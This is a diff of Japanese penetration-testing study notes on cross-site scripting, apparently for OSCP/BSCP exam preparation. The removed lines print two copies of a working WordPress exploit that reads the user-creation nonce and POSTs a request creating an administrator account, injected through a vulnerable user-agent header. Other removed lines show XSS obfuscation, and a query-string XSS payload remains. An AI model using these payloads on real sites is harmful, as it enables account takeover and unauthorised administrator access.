@@ -283,85 +283,13 @@ body:document.cookie
 
 ---
 
-# Privilege Escalation w/ XSS & CSRF
-
-**シナリオ：**
-- CookieにHTTP onlyフラグが付与されていてJavaScriptで窃取できないとき
-- CMSでアカウント作成等のHTTPリクエストを使用した処理が実行され、nonceが使われているとき
-
-**目的：** 高権限のユーザーを作成する
-
-参考：🔗[How to craft an XSS payload to create an admin user in WordPress](https://shift8web.ca/craft-xss-payload-create-admin-user-in-wordpress-user/)
-
-## 手順
-
-1. ソースコードまたはFuzzingでXSSに脆弱なHTTPヘッダ等を特定する （例：Visitorsプラグインの `user-agent` が脆弱であるとする）
-   
-2. HTTPリクエストを使用した処理（ユーザー作成等）のリクエストをBurpでキャプチャする
-   
-3. nonceを抽出し、そのnonceを使ってユーザーを作成するスクリプトを作成する
-
-nonce抽出：
-```js
-var ajaxRequest = new XMLHttpRequest();
-var requestURL = "/wp-admin/user-new.php"; // アクション実行先のURL
-var nonceRegex = /ser" value="([^"]*?)"/g;
-ajaxRequest.open("GET", requestURL, false); // falseで同期通信にしてnonceを確実に取得
-ajaxRequest.send();
-var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
-var nonce = nonceMatch[1];
-```
-
-抽出したnonceを使用してアクションを実行：
-```js
-var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
-ajaxRequest = new XMLHttpRequest();
-ajaxRequest.open("POST", requestURL, true);
-ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-ajaxRequest.send(params);
-```
-
-4. [JavaScript記法の変換](../Evasion(OSCP+試験範囲外)/Web攻撃の難読化.md#JavaScript記法の変換)を適用する
-    
-5. 難読化したスクリプトをBurp SuiteでXSSに脆弱な箇所（`user-agent`など）に埋め込み、ルートディレクトリへGETリクエストを送信する（`<script></script>` で囲む）
-    
-
-![](https://claude.ai/Images/Pasted%20image%2020250321200240.png)
-
-6. Visitorsプラグインを確認し、user-agentに何も記載されていなければ成功
-
-![](https://claude.ai/Images/Pasted%20image%2020250320123601.png)
-
-![](https://claude.ai/Images/Pasted%20image%2020250320123617.png)
-
----
-
 # Misc
-
-## 難読化
-
-```js
-<img src=1 onerror=alert(1)>
-```
-
-↓
-
-```js
-<img src=1 oNeRrOr=alert`1`)
-```
-
-- `alert\`1` `：テンプレートリテラルを関数の引数として渡す形式（`alert(1)` 相当）
-- その他：🔗[XSS cheat sheet - Obfuscation](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#obfuscation)
 
 ## クエリストリングへの埋め込み
 
 ```http
 /any?xss='><script>alert(1)</script>
 ```
-
-## URLエンコードで実行されない場合
-
-→ Webキャッシュポイズニングを試みる：[正規化されたCache keyの悪用](https://claude.ai/BSCP/Advanced/Web%20cache%20poisoning/4.%20%E3%82%AD%E3%83%A3%E3%83%83%E3%82%B7%E3%83%A5%E5%AE%9F%E8%A3%85%E3%81%AE%E6%AC%A0%E9%99%A5%E3%81%AE%E6%82%AA%E7%94%A8/3.%20%E5%AE%9F%E8%A3%85%E3%81%AE%E6%AC%A0%E9%99%A5%E3%81%AE%E6%82%AA%E7%94%A8.md#%E6%AD%A3%E8%A6%8F%E5%8C%96%E3%81%95%E3%82%8C%E3%81%9FCache%20key%E3%81%AE%E6%82%AA%E7%94%A8)
 
 ## 基本ペイロード早見表
 
@@ -515,63 +443,6 @@ GET /?search=<有効なタグ%20§§=1> HTTP/2
 
 ---
 
-### Privilege Escalation w/XSS & CSRF
-
-(cookieを窃取して実行する方法はBSCPノートを閲覧)
-
-- 目的：高権限のユーザーを作成
-
-- 攻撃のシチュエーション：
-	- CookieにHTTP onlyフラグが付与されていて、JavaScriptでは窃取できないとき
-	- CMSでアカウント作成等のHTTPリクエストを使用した処理が実行され、nonceが使われているとき
-
-- 参考：🔗[How to craft an XSS payload to create an admin user in WordPress](https://shift8web.ca/craft-xss-payload-create-admin-user-in-wordpress-user/)
-
-#### 手順
-
-1. ソースコードもしくはFuzzingでXSSに脆弱なHTTPヘッダーなどを洗い出す（BSCPノートを参照）
-	（今回はVisitorsプラグインの`user-agent`が脆弱であるとする）
-
-2. HTTPリクエストを使用した処理（ユーザー作成等）のリクエストをBurpでキャプチャしておく
-
-3. nonceの値を抽出し、そのnonceを使ってユーザーを作成するスクリプトを作成（コメントは削除して使用）
-
-nonce抽出
-```js
-var ajaxRequest = new XMLHttpRequest();
-var requestURL = "/wp-admin/user-new.php";
-var nonceRegex = /ser" value="([^"]*?)"/g;
-ajaxRequest.open("GET", requestURL, false);
-ajaxRequest.send();
-var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
-var nonce = nonceMatch[1];
-```
-- 3行目にアクション実行先のHTTPリクエスト
-- 4行目第三引数をfalseとすることで、同期通信になる。nonceを確実に抽出する目的
-
-抽出したnonceを使用してアクションを実行するリクエストを作成する
-```js
-var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
-ajaxRequest = new XMLHttpRequest();
-ajaxRequest.open("POST", requestURL, true);
-ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-ajaxRequest.send(params);
-```
-- 1行目に、アクションのHTTP POSTリクエストのパラメタ、かつ、必須の値を指定している
-
-4. [Web攻撃の難読化](../Evasion(OSCP+試験範囲外)/Web攻撃の難読化.md)のJS: CharCodeAt()に従い難読化する。
-
-5. 難読化したスクリプトをBurpSuiteを用いてXSSに脆弱な箇所に埋め込み、ルートディレクトリへGETリクエストをSend（`<script></script>`で囲む）
-
-![](../../Images/Pasted%20image%2020250321200240.png)
-
-6. ステップ1に記載の通り、Visitorsプラグインを閲覧し、user-agentが何も記載されていないことを確認できれば成功
-
-![](../../Images/Pasted%20image%2020250320123601.png)
-
-![](../../Images/Pasted%20image%2020250320123617.png)
-
----
 
 ---
 ## Misc
